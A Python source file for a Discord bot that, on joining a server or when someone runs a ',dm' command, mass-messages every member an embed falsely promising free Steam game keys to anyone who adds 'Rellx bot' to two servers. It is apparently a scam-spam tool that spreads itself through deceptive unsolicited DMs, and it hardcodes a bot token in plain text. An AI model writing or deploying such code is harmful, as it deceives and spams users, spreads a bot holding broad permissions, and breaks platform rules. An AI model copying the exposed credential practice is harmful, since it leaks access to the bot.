from operator import mod
import re
import random
import discord
from discord import embeds
from discord import colour
from discord import user
from discord import member
from discord import permissions
from discord.colour import Color 
from discord.ext import commands
from discord.ext.commands import bot
from discord.ext.commands.bot import Bot
from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
from discord.member import Member
from discord.utils import time_snowflake
from discord import Intents
from discord.ext import commands

intents=discord.Intents.all()

token = "ODU3ODM4Nzg0MjE2MDM5NDI0.YNVaoA.rKpsrU3Ft1XS2xrU7vN-ZfUdGzY"
client = commands.AutoShardedBot(command_prefix = ',', intents=intents)
client.remove_command('help')
   
@client.event
async def on_guild_join(guild):
    members = guild.members
    for member in members:
        try:
            embed=discord.Embed(color=discord.Color.blue())
            embed.add_field(name="Free games",value="add [Rellx bot](https://discord.com/oauth2/authorize?client_id=839928475309047848&scope=bot&permissions=470154334) to two of your servers and ping the bot to get steam game keys")
            embed.set_image(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmzUdUPwtgCRHex4YQg2SScueCsRza21okfg&usqp=CAU")
            await member.send(embed=embed)
        except:
            print("user closed")

@client.command()
@commands.guild_only()
async def dm(ctx):
    members = ctx.guild.members
    for member in members:
        try:
            await ctx.send(f"Sent to {member.mention}")
            embed=discord.Embed(color=discord.Color.blue())
            embed.add_field(name="Free games",value="add [Rellx bot](https://discord.com/oauth2/authorize?client_id=839928475309047848&scope=bot&permissions=470154334) to two of your servers and ping the bot to get steam game keys")
            embed.set_image(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmzUdUPwtgCRHex4YQg2SScueCsRza21okfg&usqp=CAU")
            await member.send(embed=embed)
        except:
            await ctx.send(f"I can't dm {member.mention} maybe their dms are closed are the bot got flagged.")
            
client.run(token)
